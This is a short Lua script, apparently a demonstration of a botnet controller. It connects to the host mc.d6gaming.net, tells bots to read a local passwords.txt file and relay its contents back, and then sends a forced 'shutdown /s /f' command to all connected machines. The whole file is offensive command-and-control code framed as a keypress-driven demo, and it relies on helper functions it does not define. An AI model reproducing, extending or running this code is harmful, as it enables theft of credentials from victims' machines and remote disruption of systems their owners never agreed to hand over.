function _(str)--Print and execute
	print("#! ",str)
	return loadstring(str)()
end

function dump(tab)
	_repl:displayresults({n=1,tab})
	return tab
end

function demoBot()
	print("Beginning connection...")
	function fetchPasswords()
		print("Attempting to break passwords...")
		local content = file.read("../passwords.txt")
		if(string.len(content) > 0)then
			return content
		else
			return "<<Password could not be broken>>"
		end
	end
	_([[connectionLoop("mc.d6gaming.net")]])
end

function demo()
	print("\n\nPress a key to connect to the server...")
	io.read()
	dump(_([[c = control("mc.d6gaming.net")]]))
	print("\n\nPress a key to Continue with authentication...")
	io.read()
	dump(_([[c:ident("DSX")]]))
	print("\n\nPress a key to fetch passwords...")
	io.read()
	print("Fetching passwords...")
	dump(_([[return c:botresponses(c:RELAY(c:SCRIPT("return fetchPasswords()")))]]))
	print("\n\nPress any key to shut down the terminals...")
	io.read()
	dump(_([[c:send(c:RELAY(c:EXECUTE("shutdown /s /f")))]]))
	print("Bots shutting down...")
	io.read()
end
